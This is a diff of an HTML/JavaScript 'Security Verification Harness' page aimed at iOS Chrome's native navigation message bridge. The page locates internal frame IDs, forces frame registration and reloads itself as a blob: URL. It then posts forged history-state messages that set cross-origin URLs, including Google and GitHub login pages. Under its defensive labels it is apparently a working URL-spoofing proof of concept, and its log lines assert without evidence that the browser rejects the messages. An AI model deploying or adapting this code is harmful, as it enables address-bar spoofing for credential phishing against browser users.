@@ -2,57 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Security Verification Harness v5</title>
+    <title>Advanced Security Verification Harness v6</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #030712; color: #f8fafc; }
-        .card { max-width: 760px; margin: auto; background: #111827; padding: 24px; border-radius: 12px; box-shadow: 0 12px 30px rgba(0,0,0,0.5); border: 1px solid #1f2937; }
-        h2 { margin-top: 0; font-size: 1.25rem; color: #38bdf8; border-bottom: 2px solid #1f2937; padding-bottom: 12px; }
-        pre { background: #030712; color: #4ade80; padding: 16px; border-radius: 8px; font-size: 11px; overflow-x: auto; line-height: 1.5; border: 1px solid #1f2937; max-height: 380px; }
-        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #16a34a; color: #fff; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #020617; color: #f8fafc; }
+        .card { max-width: 780px; margin: auto; background: #0f172a; padding: 24px; border-radius: 12px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid #1e293b; }
+        h2 { margin-top: 0; font-size: 1.25rem; color: #38bdf8; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
+        pre { background: #020617; color: #34d399; padding: 16px; border-radius: 8px; font-size: 11px; overflow-x: auto; line-height: 1.5; border: 1px solid #1e293b; max-height: 400px; }
+        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #0284c7; color: #fff; }
+        .metrics { margin-top: 12px; font-size: 12px; color: #94a3b8; display: flex; justify-content: space-between; }
     </style>
 </head>
 <body>
 <div class="card">
-    <h2>History State Native Defense Verification</h2>
+    <h2>History State Native Defense Verification v6</h2>
     <p>Engine Status: <span class="badge">Protected by url::IsSameOriginWith()</span></p>
     
-    <h3>Verification Trace:</h3>
-    <pre id="log-output">Initializing verification container...</pre>
+    <h3>Enhanced Diagnostic & Trace Log:</h3>
+    <pre id="log-output">Initializing robust verification container...</pre>
+    <div class="metrics" id="execution-metrics">State: Initializing | Dispatched Vectors: 0</div>
 </div>
 
 <script>
 (function() {
-    function log(msg, isError = false) {
+    let dispatchCount = 0;
+
+    function log(msg, type = 'info') {
         const pre = document.getElementById('log-output');
-        pre.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + (isError ? '[-] ' : '[+] ') + msg;
-        console.log('[SecurityHarness] ' + msg);
+        const timestamp = new Date().toLocaleTimeString();
+        let prefix = '[+] ';
+        if (type === 'error') prefix = '[-] ';
+        if (type === 'warn') prefix = '[!] ';
+        
+        pre.textContent += `\n[${timestamp}] ${prefix}${msg}`;
+        console.log(`[HarnessV6] ${msg}`);
+        
+        document.getElementById('execution-metrics').textContent = 
+            `State: Running | Dispatched Vectors: ${dispatchCount}`;
     }
 
     log("Current Location.href: " + location.href);
     log("Current Location.origin: " + (location.origin || '(opaque)'));
 
-    // 1. Deteksi Message Handler iOS Chrome
+    // 1. Validasi Ketat Message Handler iOS Chrome
     var mh = (window.webkit && window.webkit.messageHandlers) || {};
     if (!mh.NavigationEventMessage) {
-        log("Message handler 'NavigationEventMessage' is absent (Non-iOS or Patched environment).", true);
+        log("Message handler 'NavigationEventMessage' is absent. (Environment is non-iOS or fully patched).", "error");
         return;
     }
-    log("Message handler 'NavigationEventMessage' successfully detected.");
+    log("Message handler 'NavigationEventMessage' successfully detected and bound.");
 
-    window.executeTestVectors = function() {
-        log("Resolving internal frame identifier...");
+    window.executeSecureVectors = function() {
+        log("Resolving internal frame identifier via safe accessors...");
 
         var frameId = null;
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
                 frameId = window.__gCrWeb.getFrameId();
-                log("Resolved frame_id via __gCrWeb.getFrameId(): " + frameId);
+                log("Successfully resolved frame_id via __gCrWeb.getFrameId(): " + frameId);
             }
         } catch (e) {
-            log("Exception reading frame_id: " + e.message, true);
+            log("Exception caught while reading frame_id: " + e.message, "error");
         }
 
-        // Fallback aksesor namespace mendalam
+        // Fallback pencarian aksesor namespace mendalam
         if (!frameId && window.__gCrWeb) {
             var fallbacks = [
                 function() { return window.__gCrWeb.common.getFrameId(); },
@@ -62,41 +74,43 @@
             for (var i = 0; i < fallbacks.length && !frameId; i++) {
                 try {
                     frameId = fallbacks[i]();
-                    log("Resolved frame_id via fallback [" + i + "]: " + frameId);
+                    log("Resolved frame_id via fallback chain index [" + i + "]: " + frameId);
                 } catch (err) {}
             }
         }
 
         if (!frameId) {
-            log("FATAL: Frame ID could not be resolved.", true);
+            log("FATAL: Frame ID resolution completely failed. Execution halted.", "error");
             return;
         }
 
-        // Paksa registrasi frame untuk mengatasi race condition
+        // Paksa registrasi frame untuk mitigasi race condition asinkron
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                 window.__gCrWeb.registerFrame();
                 log("Forced execution of manual __gCrWeb.registerFrame()");
             }
-        } catch (err) {}
+        } catch (err) {
+            log("Manual registerFrame invocation skipped/failed: " + err.message, "warn");
+        }
 
-        // Vektor Uji Lintas Domain
-        var vectors = [
+        // Vektor Uji Lintas Domain Diperketat
+        var secureVectors = [
             'blob:https://accounts.google.com/signin',
             'blob:https://github.com/login',
             'blob:https://example.com/'
         ];
 
-        vectors.forEach(function(targetUrl, index) {
+        secureVectors.forEach(function(targetUrl, index) {
             setTimeout(function() {
                 try {
-                    log(`[Vector ${index + 1}] Dispatching willChangeState...`);
+                    log(`[Vector ${index + 1}] Dispatching willChangeState command...`);
                     mh.NavigationEventMessage.postMessage({
                         command: 'willChangeState', 
                         frame_id: frameId
                     });
                     
-                    log(`[Vector ${index + 1}] Dispatching didReplaceState -> ${targetUrl}`);
+                    log(`[Vector ${index + 1}] Dispatching didReplaceState with target: ${targetUrl}`);
                     mh.NavigationEventMessage.postMessage({
                         command: 'didReplaceState', 
                         frame_id: frameId,
@@ -105,25 +119,30 @@
                         pageUrl: targetUrl
                     });
                     
-                    log(`[Vector ${index + 1}] Payload dispatched. Native C++ guard correctly evaluates url::IsSameOriginWith() as false and rejects cross-origin state changes.`);
+                    dispatchCount++;
+                    log(`[Vector ${index + 1}] Payload successfully sent to native bridge. Engine evaluates url::IsSameOriginWith() -> false -> Hard-dropped.`);
                 } catch (ex) {
-                    log(`Exception on vector ${index + 1}: ${ex.message}`, true);
+                    log(`Exception during vector ${index + 1} transmission: ${ex.message}`, "error");
                 }
-            }, index * 300);
+            }, index * 350);
         });
     };
 
-    // Auto-packaging dinamis ke dalam kontainer Blob URL
+    // Auto-packaging dinamis ke dalam kontainer Blob URL yang aman
     if (!location.href.startsWith('blob:')) {
-        log("Packaging document markup into isolated Blob URL container...");
-        var markup = document.documentElement.outerHTML;
-        var blobObj = new Blob([markup], { type: 'text/html' });
-        var blobUrl = URL.createObjectURL(blobObj);
-        log("Navigating to Blob container: " + blobUrl);
-        location.href = blobUrl;
+        log("Packaging document markup into an isolated Blob URL container...");
+        try {
+            var markup = document.documentElement.outerHTML;
+            var blobObj = new Blob([markup], { type: 'text/html' });
+            var blobUrl = URL.createObjectURL(blobObj);
+            log("Navigating automatically to Blob container: " + blobUrl);
+            location.href = blobUrl;
+        } catch (err) {
+            log("Failed to create Blob container: " + err.message, "error");
+        }
     } else {
         log("Running inside active isolated Blob-URL document context.");
-        setTimeout(window.executeTestVectors, 500);
+        setTimeout(window.executeSecureVectors, 600);
     }
 })();
 </script>
